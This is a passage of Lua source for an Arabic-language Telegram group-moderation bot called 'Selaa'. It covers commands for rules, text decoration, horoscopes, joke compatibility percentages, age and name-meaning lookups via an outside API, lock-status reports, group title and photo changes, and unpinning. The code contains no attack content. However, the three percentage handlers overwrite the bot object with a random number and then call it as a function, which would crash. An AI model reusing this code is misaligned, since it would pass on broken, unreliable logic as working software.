Selaa(msg.chat_id_, msg.id_, 1, '↯☆ارسل لي القوانين الان', 1, 'md')
Selaa:set(Selaa..'Selaa:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^القوانين$") then
local rules = Selaa:get(Selaa..'Selaa:rules'..msg.chat_id_)
Selaa(msg.chat_id_, msg.id_, 1, rules, 1, nil)
end
--     Source Selaa     --
if text == "تفعيل الزخرفه" and Manager(msg) and SourceCh(msg) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل الزخرفه بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Zrf:Selaa'..msg.chat_id_) 
end
if text == "تعطيل الزخرفه" and Manager(msg) and SourceCh(msg) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل الزخرفه بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Zrf:Selaa'..msg.chat_id_,true)  
end
--     Source Selaa     --
if Selaa:get(Selaa..'Zrf:Selaa'..msg.chat_id_..''..msg.sender_user_id_) then 
if text and text == 'الغاء' then 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم الغاء امر الزخرفه', 1, 'md')
Selaa:del(Selaa..'Zrf:Selaa'..msg.chat_id_..''..msg.sender_user_id_)
return false  
end 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(text)) 
Zrf = JSON.decode(UrlZrf) 
t = "↯☆قائمة الزخرفه ⇇ ⤈\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Selaa(msg.chat_id_, msg.id_, 1, t, 1, 'md')
Selaa:del(Selaa..'Zrf:Selaa'..msg.chat_id_..''..msg.sender_user_id_)
return false   
end
if not Selaa:get(Selaa..'Selaa:Zrf:Selaa'..msg.chat_id_) then
if text == 'زخرفه' and SourceCh(msg) or text == 'الزخرفه' and SourceCh(msg) then  
Selaa:setex(Selaa.."Zrf:Selaa"..msg.chat_id_..""..msg.sender_user_id_,300,true)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆ارسل لي الكلمه لزخرفتها \nيمكنك الزخرفة باللغه { en } ~ { ar } ', 1, 'md')
end
end
--     Source Selaa     --
if not Selaa:get(Selaa..'Selaa:Zrf:Selaa'..msg.chat_id_) then
if text and text:match("^زخرفه (.*)$") and SourceCh(msg) or text and text:match("^زخرف (.*)$") and SourceCh(msg) then 
local TextZrf = text:match("^زخرفه (.*)$") or text:match("^زخرف (.*)$") 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(TextZrf)) 
Zrf = JSON.decode(UrlZrf) 
t = "↯☆قائمة الزخرفه ⇇ ⤈\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Selaa(msg.chat_id_, msg.id_, 1, t, 1, 'md')
end
end
--     Source Selaa     --
if text == "تفعيل الابراج" and Manager(msg) and SourceCh(msg) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل الابراج بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Brg:Selaa'..msg.chat_id_) 
end
if text == "تعطيل الابراج" and Manager(msg) and SourceCh(msg) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل الابراج بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Brg:Selaa'..msg.chat_id_,true)  
end
--     Source Selaa     --
if not Selaa:get(Selaa..'Selaa:Brg:Selaa'..msg.chat_id_) then
if text and text:match("^برج (.*)$") and SourceCh(msg) or text and text:match("^برجي (.*)$") and SourceCh(msg) then 
local TextBrg = text:match("^برج (.*)$") or text:match("^برجي (.*)$") 
UrlBrg = https.request('https://apiabs.ml/brg.php?brg='..URL.escape(TextBrg)) 
Brg = JSON.decode(UrlBrg) 
t = Brg.ok.abs  
Selaa(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source Selaa     --
if text and (text == "تفعيل اوامر النسب" or text == "تفعيل نسبه الحب" or text == "تفعيل نسبه الرجوله" or text == "تفعيل نسبه الانوثه") and Manager(msg) and SourceCh(msg) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل اوامر النسب'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Nsba:Selaa'..msg.chat_id_) 
end
if text and (text == "تعطيل اوامر النسب" or text == "تعطيل نسبه الحب" or text == "تعطيل نسبه الرجوله" or text == "تعطيل نسبه الانوثه") and Manager(msg) and SourceCh(msg) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل اوامر النسب'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Nsba:Selaa'..msg.chat_id_,true)  
end
--     Source Selaa     --
if not Selaa:get(Selaa..'Selaa:Nsba:Selaa'..msg.chat_id_) then
if text == "نسبه الحب" and SourceCh(msg) or text == "نسبة الحب" and SourceCh(msg) then
Selaa:set(Selaa..'LoveNsba:Selaa'..msg.chat_id_..msg.sender_user_id_,true) 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆قم بارسل اسمين لحساب نسبة الحب بينهما كمثال ⇇ جاك وروز', 1, 'md')
end
end
if text and text ~= "نسبه الحب" and text ~= "نسبة الحب" and Selaa:get(Selaa..'LoveNsba:Selaa'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم الغاء امر نسبة الحب ', 1, 'md')
Selaa:del(Selaa..'LoveNsba:Selaa'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Selaa = math.random(0,100);
Selaa(msg.chat_id_, msg.id_, 1, '↯☆نسبة الحب بين '..text..' هي : '..Selaa..'%', 1, 'md')
Selaa:del(Selaa..'LoveNsba:Selaa'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not Selaa:get(Selaa..'Selaa:Nsba:Selaa'..msg.chat_id_) then
if text and (text == "نسبه الرجوله" or text == "نسبة الرجوله" or text == "نسبه رجوله" or text == "نسبة رجوله") and SourceCh(msg) then
Selaa:set(Selaa..'RjolaNsba:Selaa'..msg.chat_id_..msg.sender_user_id_,true) 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆قم بارسل اسم الشخص لقياس نسبة رجولته كمثال ⇇ جاك', 1, 'md')
end
end
if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and Selaa:get(Selaa..'RjolaNsba:Selaa'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم الغاء امر نسبة الرجوله ', 1, 'md')
Selaa:del(Selaa..'RjolaNsba:Selaa'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Selaa = math.random(0,100);
Selaa(msg.chat_id_, msg.id_, 1, '↯☆نسبة رجولة '..text..' هي : '..Selaa..'%', 1, 'md')
Selaa:del(Selaa..'RjolaNsba:Selaa'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not Selaa:get(Selaa..'Selaa:Nsba:Selaa'..msg.chat_id_) then
if text and (text == "نسبه الانوثه" or text == "نسبة الانوثه" or text == "نسبه انوثه" or text == "نسبة انوثه") and SourceCh(msg) then
Selaa:set(Selaa..'AnothaNsba:Selaa'..msg.chat_id_..msg.sender_user_id_,true) 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆قم بارسل اسم الشخص لقياس نسبة انوثته كمثال ⇇ روز', 1, 'md')
end
end
if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and Selaa:get(Selaa..'AnothaNsba:Selaa'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم الغاء امر نسبة الانوثه ', 1, 'md')
Selaa:del(Selaa..'AnothaNsba:Selaa'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Selaa = math.random(0,100);
Selaa(msg.chat_id_, msg.id_, 1, '↯☆نسبة انوثة '..text..' هي : '..Selaa..'%', 1, 'md')
Selaa:del(Selaa..'AnothaNsba:Selaa'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
--     Source Selaa     --
if text == "تفعيل حساب العمر" and Manager(msg) and SourceCh(msg) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل حساب العمر'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Age:Selaa'..msg.chat_id_) 
end
if text == "تعطيل حساب العمر" and Manager(msg) and SourceCh(msg) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل حساب العمر'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Age:Selaa'..msg.chat_id_,true)  
end
--     Source Selaa     --
if not Selaa:get(Selaa..'Selaa:Age:Selaa'..msg.chat_id_) then
if text and text:match("^احسب (.*)$") and SourceCh(msg) or text and text:match("^عمري (.*)$") and SourceCh(msg) then 
local TextAge = text:match("^احسب (.*)$") or text:match("^عمري (.*)$") 
UrlAge = https.request('https://apiabs.ml/age.php?age='..URL.escape(TextAge)) 
Age = JSON.decode(UrlAge) 
t = Age.ok.abs
Selaa(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source Selaa     --
if text == "تفعيل معاني الاسماء" and Manager(msg) and SourceCh(msg) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل معاني الاسماء'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Mean:Selaa'..msg.chat_id_) 
end
if text == "تعطيل معاني الاسماء" and Manager(msg) and SourceCh(msg) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل معاني الاسماء'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Mean:Selaa'..msg.chat_id_,true)  
end
--     Source Selaa     --
if not Selaa:get(Selaa..'Selaa:Mean:Selaa'..msg.chat_id_) then
if text and text:match("^معنى الاسم (.*)$") and SourceCh(msg) or text and text:match("^معنى اسم (.*)$") and SourceCh(msg) then 
local TextMean = text:match("^معنى الاسم (.*)$") or text:match("^معنى اسم (.*)$") 
UrlMean = https.request('https://apiabs.ml/Mean.php?Selaa='..URL.escape(TextMean)) 
Mean = JSON.decode(UrlMean) 
t = Mean.ok.abs
Selaa(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source Selaa     --
if Admin(msg) then
if Selaa:get(Selaa..'Selaa:LockSettings'..msg.chat_id_) then 
if text == "الروابط" then if Selaa:get(Selaa..'Selaa:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local SelaaTEAM = "\n" .."↯☆الروابط ⇇ "..mute_links.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "المعرف" or text == "المعرفات" then if Selaa:get(Selaa..'Selaa:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local SelaaTEAM = "\n" .."↯☆المعرف ⇇ "..lock_tag.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "المتحركه" or text == "الملصقات المتحركه" then if Selaa:get(Selaa..'Selaa:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local SelaaTEAM = "\n" .."↯☆المتحركه ⇇ "..mute_gifs.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "الملصقات" then if Selaa:get(Selaa..'Selaa:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local SelaaTEAM = "\n" .."↯☆الملصقات ⇇ "..lock_sticker.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "الصور" then if Selaa:get(Selaa..'Selaa:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local SelaaTEAM = "\n" .."↯☆الصور ⇇ "..mute_photo.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "الفيديو" or text == "الفيديوهات" then if Selaa:get(Selaa..'Selaa:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local SelaaTEAM = "\n" .."↯☆الفيديو ⇇ "..mute_video.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "الاونلاين" then if Selaa:get(Selaa..'Selaa:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local SelaaTEAM = "\n" .."↯☆الاونلاين ⇇ "..mute_in.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "الدردشه" then if Selaa:get(Selaa..'Selaa:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local SelaaTEAM = "\n" .."↯☆الدردشه ⇇ "..mute_text.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "التوجيه" or text == "اعاده التوجيه" then if Selaa:get(Selaa..'Selaa:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local SelaaTEAM = "\n" .."↯☆التوجيه ⇇ "..lock_forward.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "الاغاني" then if Selaa:get(Selaa..'Selaa:Lock:Music'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local SelaaTEAM = "\n" .."↯☆الاغاني ⇇ "..mute_music.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "الصوت" or text == "الصوتيات" then if Selaa:get(Selaa..'Selaa:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local SelaaTEAM = "\n" .."↯☆الصوت ⇇ "..mute_voice.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "الجهات" or text == "جهات الاتصال" then if Selaa:get(Selaa..'Selaa:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local SelaaTEAM = "\n" .."↯☆الجهات ⇇ "..lock_contact.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "الماركداون" then if Selaa:get(Selaa..'Selaa:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local SelaaTEAM = "\n" .."↯☆الماركداون ⇇ "..markdown.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "الهاشتاك" then if Selaa:get(Selaa..'Selaa:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local SelaaTEAM = "\n" .."↯☆الهاشتاك ⇇ "..lock_htag.."\n"Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "التعديل" then if Selaa:get(Selaa..'Selaa:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local SelaaTEAM = "\n" .."↯☆التعديل ⇇ "..mute_edit.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "التثبيت" then if Selaa:get(Selaa..'Selaa:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local SelaaTEAM = "\n" .."↯☆التثبيت ⇇ "..lock_pin.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "الاشعارات" then if Selaa:get(Selaa..'Selaa:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local SelaaTEAM = "\n" .."↯☆الاشعارات ⇇ "..lock_tgservice.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "الكلايش" then if Selaa:get(Selaa..'Selaa:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local SelaaTEAM = "\n" .."↯☆الكلايش ⇇ "..lock_spam.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "الدخول" then if Selaa:get(Selaa..'Selaa:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local SelaaTEAM = "\n" .."↯☆الدخول ⇇ "..lock_Join.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "الشبكات" then if Selaa:get(Selaa..'Selaa:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local SelaaTEAM = "\n" .."↯☆الشبكات ⇇ "..lock_wp.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "المواقع" then if Selaa:get(Selaa..'Selaa:Lock:Location'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local SelaaTEAM = "\n" .."↯☆المواقع ⇇ "..lock_location.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "العربيه" then if Selaa:get(Selaa..'Selaa:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local SelaaTEAM = "\n" .."↯☆العربيه ⇇ "..lock_arabic.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "الانجليزيه" then if Selaa:get(Selaa..'Selaa:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local SelaaTEAM = "\n" .."↯☆الانجليزيه ⇇ "..lock_english.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "الكفر" then if Selaa:get(Selaa..'Selaa:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local SelaaTEAM = "\n" .."↯☆الكفر ⇇ "..lock_kaf.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "الفشار" then if Selaa:get(Selaa..'Selaa:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local SelaaTEAM = "\n" .."↯☆الفشار ⇇ "..lock_fshar.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
if text == "الطائفيه" then if Selaa:get(Selaa..'Selaa:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local SelaaTEAM = "\n" .."↯☆الطائفيه ⇇ "..lock_taf.."\n" Selaa(msg.chat_id_, msg.id_, 1, SelaaTEAM, 1, 'md') end
end
--     Source Selaa     --
if text == 'تفعيل كشف الاعدادات' and ChCheck(msg) then 
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل كشف الاعدادات'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:LockSettings'..msg.chat_id_,true)  
end
if text == 'تعطيل كشف الاعدادات' and ChCheck(msg) then 
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل كشف الاعدادات'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:LockSettings'..msg.chat_id_) 
end
--     Source Selaa     --
if text == 'تفعيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل ردود المدير'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:GpRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل ردود المدير'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:GpRed'..msg.chat_id_,true)
end
--     Source Selaa     --
if text == 'تفعيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل ردود المطور'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:AllRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل ردود المطور'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:AllRed'..msg.chat_id_,true)
end
--     Source Selaa     --
if Sudo(msg) then
if text == 'تفعيل المغادره' or text == '⇇ تفعيل المغادره ⌁' then 
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل المغادره بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa.."Selaa:Left:Bot"..Selaa)
end
if text == 'تعطيل المغادره' or text == '⇇ تعطيل المغادره ⌁' then 
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل المغادره بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa.."Selaa:Left:Bot"..Selaa,true) 
end 
if text == 'تفعيل الاذاعه' or text == '⇇ تفعيل الاذاعه ⌁' then 
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل الاذاعه بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa.."Selaa:Send:Bot"..Selaa)
end
if text == 'تعطيل الاذاعه' or text == '⇇ تعطيل الاذاعه ⌁' then 
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل الاذاعه بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa.."Selaa:Send:Bot"..Selaa,true) 
end
end
--     Source Selaa     --
if text and text:match("^ضع اسم (.*)$") and Manager(msg) and ChCheck(msg) then
local txt = {string.match(text, "^(ضع اسم) (.*)$")}
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = txt[2] },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_,"↯☆البوت ليس ادمن يرجى ترقيتي !")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"↯☆ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات")  
else
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تغيير اسم المجموعه'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
end,nil) 
end
--     Source Selaa     --
if msg.content_.photo_ then
if Selaa:get(Selaa..'Selaa:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
else
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,"↯☆عذرا البوت ليس ادمن يرجى ترقيتي والمحاوله لاحقا") 
Selaa:del(Selaa..'Selaa:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"↯☆ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات") 
Selaa:del(Selaa..'Selaa:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
else
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تغيير صورة المجموعه'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
end,nil) 
Selaa:del(Selaa..'Selaa:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
end 
end
if text and text:match("^ضع صوره$") and ChCheck(msg) or text and text:match("^وضع صوره$") and ChCheck(msg) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆ارسل صورة المجموعه الان \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     Source Selaa     --
if text and text:match("^حذف الصوره$") and ChCheck(msg) or text and text:match("^مسح الصوره$") and ChCheck(msg) then
https.request("https://api.telegram.org/bot"..TokenBot.."/deleteChatPhoto?chat_id="..msg.chat_id_) 
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف صورة المجموعه \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
return false  
end
--     Source Selaa     --
if Manager(msg) then
if text and text:match("^الغاء تثبيت$") and ChCheck(msg) or text and text:match("^الغاء التثبيت$") and ChCheck(msg) then
if Selaa:sismember(Selaa.."Selaa:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Selaa(msg.chat_id_,msg.id_, 1, "↯☆التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
Selaa:del(Selaa..'Selaa:PinnedMsg'..msg.chat_id_)
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم الغاء تثبيت الرساله'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"↯☆انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"↯☆ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
return false  
end
end,nil)
end
--     Source Selaa     --
if text and text:match("^الغاء تثبيت الكل$") then  
if Selaa:sismember(Selaa.."Selaa:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Selaa(msg.chat_id_,msg.id_, 1, "↯☆التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
